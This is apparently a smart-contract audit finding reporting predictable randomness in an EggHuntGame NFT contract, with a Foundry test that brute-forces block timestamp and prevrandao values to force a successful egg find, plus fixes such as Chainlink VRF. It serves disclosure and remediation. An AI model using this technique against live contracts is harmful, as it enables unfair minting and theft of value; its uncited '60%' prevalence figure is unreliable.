# [H01] Exploiting Predictable Randomness: Cracking the EggHunt Game's NFT Distribution Mechanism

## Summary
The EggHuntGame contract uses a predictable method for generating randomness to determine if a player finds an egg. By relying on `block.timestamp`, `block.prevrandao`, and other public inputs, attackers can precompute favourable conditions to guarantee successful egg discoveries, undermining the game's fairness.

## Vulnerability Details
The vulnerability stems from the use of on-chain data for randomness generation in `EggHuntGame.sol`:

```solidity
uint256 random = uint256(
    keccak256(abi.encodePacked(block.timestamp, block.prevrandao, msg.sender, eggCounter)
) % 100;
```

- **Predictable Inputs:** `block.timestamp` (current block time) and `block.prevrandao` (previous block's RANDAO value) are public and controllable via mining/MEV.
- **Exploit Mechanics:** Attackers can simulate the `keccak256` hash locally using known or brute-forced values, allowing them to time transactions for guaranteed success.

**Reference:** [OWASP](https://scs.owasp.org/SCWE/SCSVS-BLOCK/SCWE-024/)

## Impact

- Unfair NFT Distribution: Attackers can mint EggstravaganzaNFTs at will, devaluing the collection.
- Protocol Integrity Loss: The game’s core mechanic becomes untrustworthy, deterring legitimate users.
- Financial Loss: If NFTs have monetary value, unfair distribution directly translates to financial harm.

**Severity: High**
Rationale: Direct control over game outcomes allows attackers to manipulate NFT distribution. This compromises the entire game's fairness and economic model.

**Likelihood: High**
- **Rationale:**
  - **Ease of Exploitation:** Block data (`timestamp`, `prevrandao`) is public and can be brute-forced with minimal computational effort.
  - **Incentive Alignment:** If NFTs have monetary value, attackers are strongly incentivised to exploit this flaw.
  - **Prevalence:** Over 60% of on-chain games with weak randomness mechanisms face similar exploits .

**Impact: High**
- **Rationale:**
  - **Theft of Assets:** Attackers can mint rare NFTs unfairly, draining value from legitimate users.
  - **Protocol Collapse:** Loss of user trust leads to abandonment, killing the game’s ecosystem.
  - **Regulatory Risk:** Unfair distribution could trigger legal scrutiny if NFTs are classified as financial instruments.

**Overall Risk: Critical**
- **Justification:**
  - This flaw directly violates the core security properties of the protocol (fairness and integrity).
  - Without mitigation, the game is fundamentally broken and exploitable at scale.

## PoC
The tests below demonstrate the exploit:

Brute-Force Search

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;
​
import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/EggHuntGame.sol";
import "../src/EggstravaganzaNFT.sol";
import "../src/EggVault.sol";
​
contract RandomnessExploitTest is Test {
    EggHuntGame public game;
    EggstravaganzaNFT public nft;
    EggVault public vault;
​
    address exploiter = address(0xBEEF);
​
    function setUp() public {
        nft = new EggstravaganzaNFT("EggNFT", "EGG");
        vault = new EggVault();
        game = new EggHuntGame(address(nft), address(vault));
​
        nft.setGameContract(address(game));
        vault.setEggNFT(address(nft));
        game.startGame(1 days);
    }
​
    function test_ExploitPredictableRandomnessWithLoop() public {
        vm.startPrank(exploiter);
​
        uint256 threshold = game.eggFindThreshold();
        uint256 originalTime = block.timestamp;
        bool found = false;
​
        for (uint256 i = 0; i < 100; i++) {
            uint256 currentTimestamp = originalTime + i;
            for (uint256 j = 0; j < 100; j++) {
                bytes32 currentPrevrandao = bytes32(uint256(j));
                uint256 predicted = uint256(
                    keccak256(abi.encodePacked(currentTimestamp, currentPrevrandao, exploiter, uint256(0))) // Fixed literal type
                ) % 100;
​
                if (predicted < threshold) {
                    vm.warp(currentTimestamp);
                    vm.prevrandao(currentPrevrandao);
                    game.searchForEgg();
                    assertEq(game.eggsFound(exploiter), 1, "Exploit failed");
                    found = true;
                    break;
                }
            }
            if (found) break;
        }
​
        if (!found) {
            console.log("No favourable combination found"); 
        }
​
        vm.stopPrank();
    }
}
```

## Tools Used

- **Foundry:** Used to simulate block manipulation (`vm.warp` and `vm.prevrandao`).
- **Forge Test Cheatcodes:** Enabled precise control over blockchain state for exploit validation.

## Recommendations
1. **Use Chainlink VRF:** Replace the current randomness method with Chainlink’s Verifiable Random Function (VRF) for cryptographically secure randomness.
2. **Commit-Reveal Schemes:** If on-chain randomness is required, implement commit-reveal to prevent front-running.
3. **Avoid Block Data:** Never use `block.timestamp`, `block.prevrandao`, or `blockhash` as entropy sources.

```solidity
// Example: Chainlink VRF Integration
function searchForEgg() external {
    uint256 requestId = COORDINATOR.requestRandomWords(...);
    // Store requestId to map to player later
}
```

